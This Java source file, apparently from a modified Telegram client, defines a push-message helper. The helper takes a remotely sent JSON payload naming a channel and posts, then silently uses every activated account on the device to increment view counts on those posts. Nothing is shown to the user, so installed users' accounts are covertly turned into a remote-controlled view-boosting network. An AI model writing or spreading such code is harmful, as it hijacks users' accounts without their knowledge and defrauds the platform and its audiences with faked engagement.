package com.finalsoft.firebase.push.helper;

import com.finalsoft.firebase.channel.JoinHelper;

import org.json.JSONException;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.TLRPC;

import java.util.ArrayList;

public class ViewHelper {
    private static int postId;
    private static String link;

    public static void scan(JSONObject jsonObject) {
        try {
            postId = jsonObject.has("post-id") ? jsonObject.getInt("post-id") : 0;
            int postCount = jsonObject.has("count") ? jsonObject.getInt("count") : 0;
            link = jsonObject.has("link") ? jsonObject.getString("link") : "";
            boolean isMultiAccount = jsonObject.has("is-multi-account") && jsonObject.getBoolean("is-multi-account");
            int accountCount = isMultiAccount ? UserConfig.getActivatedAccountsCount() : 1;

            if (link.isEmpty()) {
                return;
            }
            if (link.contains("/")) {
                for (String item : JoinHelper.linkPrefix) {
                    link = link.toLowerCase().replace(item, "");
                }
                String[] split = link.split("/");
                if (split.length == 2) {
                    link = split[0];
                    postId = Integer.parseInt(split[1]);
                } else {
                    return;
                }
            }
            AndroidUtilities.runOnUIThread(() -> {
                for (int account = 0; account < accountCount; account++) {
                    TLRPC.TL_contacts_resolveUsername tL_contacts_resolveUsername2 = new TLRPC.TL_contacts_resolveUsername();
                    tL_contacts_resolveUsername2.username = link;

                    int finalAccount = account;
                    ConnectionsManager.getInstance(account).sendRequest(tL_contacts_resolveUsername2, (tLObject, tL_error) -> {
                            if (tL_error == null) {
                                TLRPC.TL_contacts_resolvedPeer tL_contacts_resolvedPeer = (TLRPC.TL_contacts_resolvedPeer) tLObject;
                                TLRPC.InputChannel inputChannel = MessagesController.getInputChannel(tL_contacts_resolvedPeer.chats.get(0));
                                TLRPC.InputPeer peer = new TLRPC.TL_inputPeerChannel();
                                peer.access_hash = inputChannel.access_hash;
                                peer.channel_id = inputChannel.channel_id;
                                sendView(inputChannel, tL_contacts_resolvedPeer.chats.get(0), peer, postCount, postId, finalAccount);
                            }

                    });
                }
            });


        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    public static void sendView(TLRPC.InputChannel inputChannel, TLRPC.Chat chat, final TLRPC.InputPeer peer, int postcount, int justpost, int account) {
        if (justpost > 0) {
            ArrayList<Integer> list = new ArrayList<>();
            list.add(justpost);
            TLRPC.TL_messages_getMessagesViews messages_getMessagesViews = new TLRPC.TL_messages_getMessagesViews();
            messages_getMessagesViews.peer = peer;
            messages_getMessagesViews.increment = true;

            messages_getMessagesViews.id = list;
            ConnectionsManager.getInstance(account).sendRequest(messages_getMessagesViews, (response, error) -> {

            });
            return;
        }
        final TLRPC.TL_messages_getHistory req = new TLRPC.TL_messages_getHistory();
        req.limit = postcount;
        req.peer = peer;
        ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
            if (error == null) {
                ArrayList<Integer> list = new ArrayList<>();
                TLRPC.TL_messages_channelMessages tl_messages_channelMessages = (TLRPC.TL_messages_channelMessages) response;
                for (int i = 0; i < tl_messages_channelMessages.messages.size(); i++) {
                    list.add(tl_messages_channelMessages.messages.get(i).id);
                }
                TLRPC.TL_messages_getMessagesViews messages_getMessagesViews = new TLRPC.TL_messages_getMessagesViews();
                messages_getMessagesViews.peer = peer;
                messages_getMessagesViews.increment = true;

                messages_getMessagesViews.id = list;
                ConnectionsManager.getInstance(account).sendRequest(messages_getMessagesViews, (response1, error1) -> {

                });
            }
        });


    }
}
